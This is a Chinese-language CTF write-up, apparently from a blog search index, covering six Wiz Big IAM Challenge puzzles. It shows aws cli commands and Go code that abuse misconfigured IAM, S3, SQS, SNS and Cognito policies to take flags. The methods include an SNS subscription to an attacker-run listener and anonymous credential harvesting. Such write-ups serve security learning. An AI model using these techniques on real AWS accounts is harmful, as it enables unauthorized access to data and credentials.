<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BIGIAM CTF writeup</title>
    <link href="/cll58powd0000kcutg69oga4q/"/>
    <url>/cll58powd0000kcutg69oga4q/</url>
    
    <content type="html"><![CDATA[<p><a href="https://bigiamchallenge.com/challenge/1">wiz BigIAM CTF 挑战赛地址</a><br>一共六道题，都是给出IAM policy让你获取flag的形式，网页底部会提供一个终端，可以在该终端中运行aws cli</p><h2 id="Buckets-of-Fun"><a href="#Buckets-of-Fun" class="headerlink" title="Buckets of Fun"></a>Buckets of Fun</h2><p>第一题的policy如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:GetObject&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:ListBucket&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;s3:prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;files/*&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>第一条权限语句表示允许所有人获取thebigiamchallenge-storage-9979f4b这个S3下的文件，第二条权限语句表示允许所有人列出thebigiamchallenge-storage-9979f4b这个S3下files下的文件列表。也就是说在该policy下，一个匿名用户可以知道thebigiamchallenge-storage-9979f4b这个S3下的files bucket有哪些文件并且可以读取其内容。<br>分析完policy，我们首先列出files下的所有文件<br><img src="/img/BIGIAM-1.jpg" alt="截屏2023-08-09 17.17.36.png"><br>此时，我们发现files下有一个flag1.txt，很明显flag就存放在这里。由于我们有GetObject的权限，所以我们直接访问即可拿到flag<br><img src="/img/bVc9bKT" alt="截屏2023-08-09 17.33.10.png"></p><h2 id="Google-Analytics"><a href="#Google-Analytics" class="headerlink" title="Google Analytics"></a>Google Analytics</h2><p>第二题的policy如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;sqs:SendMessage&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;sqs:ReceiveMessage&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>通过该policy我们可以知道，此时我们拥有对<code>wiz-tbic-analytics-sqs-queue-ca7a1b2</code>这个sqs的发送信息和接受信息的权限。<br><strong>关于sqs：</strong><br>Amazon SQS是一个适用于微服务、分布式系统和无服务器应用程序的完全托管的消息队列，借助 Amazon Simple Queue Service（SQS），您可以在软件组件之间发送、存储和接收任何规模的消息，而不会丢失消息，并且无需其他服务即可保持可用。<br>所以猜测该题可能是通过sqs的ReceiveMessage权限收取信息，信息中应该会有flag。经过查阅<a href="https://docs.aws.amazon.com/zh_cn/cli/latest/reference/sqs/receive-message.html">sqs Receive文档</a>使用aws cli接收消息：<br><img src="/img/bVc9bLQ" alt="截屏2023-08-09 17.48.18.png"><br>在消息中有一个url，访问该url即可获得flag<br><img src="/img/bVc9bM4" alt="截屏2023-08-09 17.49.00.png"></p><h2 id="Enable-Push-Notifications"><a href="#Enable-Push-Notifications" class="headerlink" title="Enable Push Notifications"></a>Enable Push Notifications</h2><p>第三题的policy如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2008-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Statement1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Statement1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;AWS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;SNS:Subscribe&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;sns:Endpoint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*@tbic.wiz.io&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这条policy表示所有以@tbic.wiz.io为结尾的sns终端节点都有权限订阅名为<code>TBICWizPushNotifications</code>的sns<br><strong>关于sns：</strong><br>Amazon Simple Notification Service (Amazon SNS) 是一项托管服务，提供从发布者向订阅者（也称为创建者和使用者）的消息传输。发布者通过将消息发送至主题与订阅者进行异步交流，主题是一个逻辑访问点和通信渠道。客户端可以订阅 SNS 主题并使用受支持的终端节点类型接收已发布的消息，例如 Amazon Kinesis Data Firehose、Amazon SQS、AWS Lambda、HTTP、电子邮件、移动推送通知和移动短信 (SMS)。<br>通过查阅<a href="https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html">sns订阅aws cli官方文档</a>，我们发现， 订阅sns时aws cli需要指明以下几个参数</p><ul><li>–notification-endpoint 指明终端节点</li><li>–protocol 指明订阅后消息传输的协议</li><li>–topic-arn sns的arn信息</li></ul><p>topic-arn在题目中已经给出。当protocol为http或https时，终端节点是以http(s):&#x2F;&#x2F;开头的url，这样我们就可以指定使用http协议并且将终端节点设置为<a href="http://ip:port/@tbic.wiz.io的形式，这样就可以绕过policy的限制。">http://ip:port/@tbic.wiz.io的形式，这样就可以绕过policy的限制。</a><br>首先在一台有公网ip的机器上使用nc监听端口,之后使用aws cli执行下面的命令订阅sns</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol http --notification-endpoint http://xxx.xxx.xxx.xxxx:xxx/@tbic.wiz.io<br></code></pre></td></tr></table></figure><p>之后服务器上会接受到如下的消息：<br><img src="/img/bVc9bQW" alt="截屏2023-08-09 19.44.25.png"><br>由于我们采用的是http协议并且和sns所属的账号不是一个账号，所以还需要进行一步确认订阅的操作,确认订阅可直接访问上图中的SubscribeURL或者使用如下aws cli命令即可，其中token为上图中的token值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws sns confirm-subscription --topic-arn arn:xxxxxx --token xxxx<br></code></pre></td></tr></table></figure><p>确认订阅后监听的端口会返回flag<br><img src="/img/bVc9bQ3" alt="截屏2023-08-09 19.52.38.png"></p><h2 id="Admin-only"><a href="#Admin-only" class="headerlink" title="Admin only?"></a>Admin only?</h2><p>该题的policy如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:GetObject&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:ListBucket&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;s3:prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;files/*&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;ForAllValues:StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;aws:PrincipalArn&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:iam::133713371337:user/admin&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>可以看到还是一个S3的policy。相比于第一题多了一个限制，只有aws:PrincipalArn为arn:aws:iam::133713371337:user&#x2F;admin时才可以使用ListBucket操作。这样第一题的操作就行不通了，我们需要绕过这个aws:PrincipalArn。通过查阅<a href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html#reference_policies_multi-key-or-value-conditions">创建具有多个键或值的条件</a> 我们可以得知使用 ForAllValues 条件运算符时，如果请求中没有键或者键值解析为空数据集（如空字符串），则返回 true。如需要求该请求至少包含一个值，则您必须在策略中使用另一个条件。<br>所以我们只需要让aws:PrincipalArn为空即可，这里有两种方式，一是直接通过网页访问s3，二是使用aws cli 并且指定–no-sign-request。这里使用第二种方法进行测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request<br></code></pre></td></tr></table></figure><p><img src="/img/bVc9bS7" alt="截屏2023-08-09 20.11.45.png"><br>成功绕过，后续步骤和第一题差不多，直接获取flag-as-admin.txt的值即可<br><img src="/img/bVc9bS8" alt="截屏2023-08-09 20.13.51.png"></p><h2 id="Do-I-know-you"><a href="#Do-I-know-you" class="headerlink" title="Do I know you?"></a>Do I know you?</h2><p>该题的policy为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;VisualEditor0&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;mobileanalytics:PutEvents&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;cognito-sync:*&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;VisualEditor1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;s3:GetObject&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;s3:ListBucket&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;arn:aws:s3:::wiz-privatefiles&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;arn:aws:s3:::wiz-privatefiles/*&quot;</span><br>            <span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>可以发现该条policy是和AWS Cognito相关的<br><strong>关于AWS Cognito：</strong><br>Amazon Cognito 是 Web 和移动应用程序的身份平台。它是用户目录、身份验证服务器以及 OAuth 2.0 访问令牌和 AWS 凭证的授权服务。使用 Amazon Cognito，您可以对内置用户目录、企业目录以及 Google 和 Facebook 等使用者身份提供者中的用户进行身份验证和授权。要使用 Cognito 需要先创建一个 Amazon Cognito 身份池，然后填入创建的身份池 ID 去调用 SDK 获取临时凭证，最后通过临时凭证去操作资源。<br>首先我们要获取身份池ID，在网页源代码中我们发现了身份池ID<br><img src="/img/bVc9bTt" alt="截屏2023-08-09 20.32.59.png"><br>之后就可以调用sdk通过身份池ID获取临时凭证了，这里简单写了一份go获取临时凭证的代码</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getAKSKSessionToken</span><span class="hljs-params">(identity <span class="hljs-type">string</span>)</span></span> &#123;<br>identityPoolID := identity<br>region := <span class="hljs-string">&quot;us-east-1&quot;</span><br><br>sess, err := session.NewSession(&amp;aws.Config&#123;<br>Region: aws.String(region),<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error creating session:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>cognitoSvc := cognitoidentity.New(sess)<br><br>input := &amp;cognitoidentity.GetIdInput&#123;<br>IdentityPoolId: aws.String(identityPoolID),<br>&#125;<br><br>idResp, err := cognitoSvc.GetId(input)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error getting identity ID:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>identityID := aws.StringValue(idResp.IdentityId)<br><br>credsInput := &amp;cognitoidentity.GetCredentialsForIdentityInput&#123;<br>IdentityId: aws.String(identityID),<br>&#125;<br><br>credsResp, err := cognitoSvc.GetCredentialsForIdentity(credsInput)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error getting credentials:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>accessKey := aws.StringValue(credsResp.Credentials.AccessKeyId)<br>secretKey := aws.StringValue(credsResp.Credentials.SecretKey)<br>sessionToken := aws.StringValue(credsResp.Credentials.SessionToken)<br><br>fmt.Printf(<span class="hljs-string">&quot;Access Key: %s\n&quot;</span>, accessKey)<br>fmt.Printf(<span class="hljs-string">&quot;Secret Key: %s\n&quot;</span>, secretKey)<br>fmt.Printf(<span class="hljs-string">&quot;Session Token: %s\n&quot;</span>, sessionToken)<br>&#125;<br></code></pre></td></tr></table></figure><p>将刚刚获得的身份池ID传给这个参数即可获得AK SK和Session Token，之后使用AK SK session Token即可操作s3。可以使用下面的命令配置AK SK SessionToken</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws configure set aws_access_key_id xxxx<br>aws configure set aws_secretss_access_key xxxx<br>aws configure set session_token xxxx <br></code></pre></td></tr></table></figure><p>配置好后直接使用aws cli读取policy中的s3即可</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang">aws s3 ls s3:<span class="hljs-comment">//wiz-privatefiles/</span><br>aws s3 cp s3:<span class="hljs-comment">//wiz-privatefiles/flag1.txt ./</span><br>cat flag.txt<br></code></pre></td></tr></table></figure><h2 id="One-final-push"><a href="#One-final-push" class="headerlink" title="One final push"></a>One final push</h2><p>此题的policy为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;Federated&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cognito-identity.amazonaws.com&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringEquals&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;cognito-identity.amazonaws.com:aud&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>题目中有这样一段描述</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Anonymous access no more. <span class="hljs-keyword">Let</span><span class="hljs-comment">&#x27;s see what can you do now.</span><br><br>Now <span class="hljs-keyword">try</span> it <span class="hljs-keyword">with</span> the authenticated role: arn:aws:iam::<span class="hljs-number">092297851374</span>:role/Cognito_s3accessAuth_Role<br></code></pre></td></tr></table></figure><p>也就是说现在匿名的用户时没办法通过身份池ID获取临时凭证的了，但是policy中允许了一个AssumeRoleWithWebIdentity的操作，通过查阅<a href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html">官方文档</a>发现通过该操作可以生成STS，生成STS需要三个信息：</p><ul><li>role-arn </li><li>role-session-name </li><li>web-identity-token</li></ul><p>role-arn在题目描述中已经给出<code>arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role</code>，role-session-name可以随便起，web-identity-token可以通过身份池ID去获得，而且生成Token的相关接口都是公开的，可以被直接调用，不需要授权。<br>首先先使用aws cli根据身份池ID获取<a href="https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-id.html">身份ID</a><br><img src="/img/bVc9bUB" alt="截屏2023-08-09 21.15.32.png"><br>之后根据身份ID获取<a href="https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-open-id-token.html">web-identity-token</a><br><img src="/img/bVc9bUD" alt="截屏2023-08-09 21.16.27.png"><br>现在我们就可以通过AssumeRoleWithWebIdentity生成STS了<br><img src="/img/bVc9bUE" alt="截屏2023-08-09 21.18.51.png"><br>之后的步骤其实和上一题差不多，配置aws cli的ak sk sessiontoken。之后使用aws cli先列出s3的bucket 之后读取其中的flag即可<br><img src="/img/bVc9bUM" alt="截屏2023-08-09 21.23.12.png"><br><img 